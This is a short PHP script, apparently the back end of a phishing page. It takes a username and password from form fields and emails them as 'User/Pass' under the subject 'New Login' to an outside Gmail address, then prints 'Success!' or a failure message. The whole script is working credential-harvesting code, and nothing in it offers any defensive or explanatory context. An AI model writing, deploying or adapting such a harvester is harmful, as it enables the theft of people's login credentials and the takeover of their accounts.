<?php

$email_from = 'priansh123@me.com';

$headers = 'From: '.$email_from."\r\n".
 
'Reply-To: '.$email_from."\r\n" .
 
'X-Mailer: PHP/' . phpversion();

$username = $_POST['user'];
$password = $_POST['pass'];
$message = "User/Pass: ".$username."/".$password;
if(@mail('hellopriansh@gmail.com','New Login',$message, $headers) )
{echo("Success!");}

else { echo("Failure... contact admin."); }
?>
<br />
More features coming soon. 